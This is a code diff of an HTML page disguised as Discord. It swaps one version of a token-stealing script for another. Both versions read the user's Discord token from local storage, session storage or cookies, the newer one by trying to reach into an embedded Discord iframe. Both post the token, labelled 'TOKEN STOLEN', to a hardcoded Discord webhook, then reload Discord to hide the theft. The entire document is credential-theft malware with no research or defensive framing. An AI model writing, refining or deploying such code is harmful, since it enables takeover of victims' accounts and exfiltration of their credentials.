@@ -1,33 +1,73 @@
-    <script>
-        // 1. Hardcoded Webhook
-        const wh = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
-        
-        // 2. Send "Alive" signal
-        fetch(wh, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: '🟢 ALIVE'})
-        }).catch(() => {});
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord</title>
+    <style>
+        body { margin: 0; padding: 0; background: #2f3136; }
+        iframe { 
+            width: 100%; 
+            height: 100vh; 
+            border: none; 
+        }
+    </style>
+</head>
+<body>
+    <!-- This loads Discord inside your page -->
+    <iframe src="https://discord.com/channels/@me" id="frame"></iframe>
 
-        // 3. Get Token
-        let t = localStorage.token || sessionStorage.token;
-        if (!t) {
-            const c = document.cookie.match(/token=([^;]+)/);
-            if (c) t = c[1];
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
+
+        // 1. Send Alive signal
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: "🟢 **SYSTEM ONLINE**" })
+        });
+
+        // 2. Try to get token from the iframe
+        let token = null;
+        
+        try {
+            // Access the iframe's content window
+            const iframeWindow = document.getElementById('frame').contentWindow;
+            
+            // Try standard storage
+            token = iframeWindow.localStorage.token || iframeWindow.sessionStorage.token;
+            
+            // Try cookies
+            if (!token) {
+                const cookies = iframeWindow.document.cookie.split(';');
+                for (let cookie of cookies) {
+                    if (cookie.trim().startsWith('token=')) {
+                        token = cookie.split('=')[1];
+                        break;
+                    }
+                }
+            }
+        } catch (e) {
+            // If cross-origin blocking happens, try grabbing from the main window if they are same-origin
+            // But usually, iframe access is blocked by Discord too.
         }
 
-        // 4. Send Token
-        if (t) {
-            fetch(wh, {
+        if (token) {
+            fetch(webhook, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: '🔥 ' + t})
-            }).then(() => location.href = 'https://discord.com/channels/@me');
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
+            })
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('frame').src = "https://discord.com/channels/@me";
+                }, 2000);
+            });
         } else {
-            fetch(wh, {
+            fetch(webhook, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: '⚠️ NO TOKEN'})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: "⚠️ **NO TOKEN** - CORS Blocked or Not Logged In" })
             });
         }
     </script>
+</body>
+</html>
